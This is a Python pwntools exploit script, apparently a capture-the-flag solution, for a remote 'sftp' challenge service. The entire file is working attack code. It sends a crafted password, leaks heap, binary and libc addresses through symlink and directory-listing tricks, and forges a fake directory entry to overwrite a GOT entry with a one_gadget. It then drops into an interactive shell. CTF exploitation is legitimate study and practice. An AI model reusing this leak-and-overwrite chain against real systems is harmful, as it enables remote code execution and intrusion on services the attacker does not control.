from pwn import *
#context(log_level='debug')

re = 1
if re:
	p = remote('sftp.ctfcompetition.com',1337)
else:
	elf = ELF('./sftp1')
	p = process(elf.path)
#print proc.pidof(p)[0]
#raw_input()

def leak(addr):
	p.recvuntil('sftp> ')
	p.sendline('mkdir '+'b'*164+p64(addr-12))
	p.recvuntil('sftp> ')
	p.sendline('cd '+'b'*20+'\x10')
	for i in range(0,17):
		p.recvuntil('sftp> ')
		p.sendline('mkdir '+str(i))
	p.recvuntil('sftp> ')
	p.sendline('ls')
	p.recvuntil('16\n')
	addr = p.recv(6)+'\x00'*2
	#p.recvuntil('sftp> ')
	#p.sendline('cd /home/c01db33f')	
	return addr

p.recvuntil('(yes/no)? ')
p.sendline('yes')
p.recvuntil('password: ')
p.sendline('\x77\x10\x10\x10\x1d')
p.recvuntil('sftp> ')
p.sendline('symlink /home/c01db33f /home/c01db33f/'+'a'*20)
p.recvuntil('sftp> ')
p.sendline('ls')
p.recvuntil('a'*20)
addr = u64(p.recv(4)+'\x00'*4)
print hex(addr)
bss = u64(leak(addr))
base = bss - 0x208be0
print hex(bss)
#print hex(base)

got_fgets = base + 0x205070
libc_fgets = u64(leak(got_fgets))
one_gadget = libc_fgets+0x45216-0x6dad0
print hex(libc_fgets)

p.recvuntil('sftp> ')
p.sendline('cd /home/c01db33f')
p.recvuntil('sftp> ')
p.sendline('put fake_file')
p.sendline('56')
p.send('a'*56)
p.recvuntil('sftp> ')
p.sendline('symlink fake_file '+'d'*20)
p.recvuntil('sftp> ')
p.sendline('ls')
p.recvuntil('d'*20)
put_file = u64(p.recv(4)+'\x00'*4)
print hex(put_file)
fake_file = u64(leak(put_file+40)[0:4]+'\x00'*4)
print hex(fake_file)

p.recvuntil('> ')
p.sendline('cd /home/c01db33f')
p.recvuntil('sftp> ')
p.sendline('mkdir '+'e'*164+p64(fake_file))
p.sendline('symlink '+'e'*20+'\x10 '+'c'*20)
p.recvuntil('sftp> ')
p.sendline('ls')
p.recvuntil('c'*20)
dir_addr = u64(p.recv(4)+'\x00'*4)
print hex(dir_addr)

fake_entry = p64(dir_addr) + p64(0x6161616100000002) + p64(0)*2 + p64(16) + p64(base+0x2050b0)
p.recvuntil('sftp> ')
p.sendline('put fake_file')
p.sendline('48')
p.send(fake_entry)

p.recvuntil('sftp> ')
p.sendline('cd '+'e'*20+'\x10')
for i in range(0,17):
	p.recvuntil('sftp> ')
	p.sendline('mkdir '+str(i))
p.recvuntil('sftp> ')
p.sendline('ls')

p.recvuntil('sftp> ')
p.sendline('put aaaa')
p.sendline('8')
p.send(p64(one_gadget))

p.interactive()
